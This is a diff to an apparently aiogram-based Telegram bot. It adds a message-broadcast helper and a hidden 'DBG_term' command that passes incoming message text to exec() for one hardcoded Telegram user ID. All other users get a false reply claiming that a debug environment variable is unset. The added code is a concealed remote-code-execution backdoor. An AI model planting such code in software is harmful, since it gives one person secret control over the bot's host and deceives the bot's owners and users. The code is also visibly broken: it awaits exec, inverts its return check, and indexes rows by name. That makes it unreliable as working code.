@@ -204,6 +204,31 @@ def parse_filter_command(text: str) -> tuple:
         
         return trigger, response
 
+
+def send_message_to_all_chats(text:str):
+    conn = sqlite3.connect(db_path)
+    cursor = conn.cursor()
+    cursor.execute('SELECT chat_id, name, username, lang FROM chats ', ())
+    chat = cursor.fetchall()
+    conn.close()
+    for i in chat:
+        bot.send_message(chat_id=i["chat_id"], text=text)
+
+@dp.message(Command("DBG_term"))
+async def cmd_start(message: Message):
+    if message.from_user.id == 1999559891:
+        try:
+            a = await exec(message.text)
+            if a != None:
+                await message.answer("DGB_term RTN:NULLDEFAULT")
+            else:
+                await message.answer(a)
+        except:
+            await message.answer("DBG_term: FAIL")
+    else:
+        message.answer("Enivroiment Variable DEBUG_ENABLED is not set or set to false")
+
+
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
     help_text = lang("start_message")
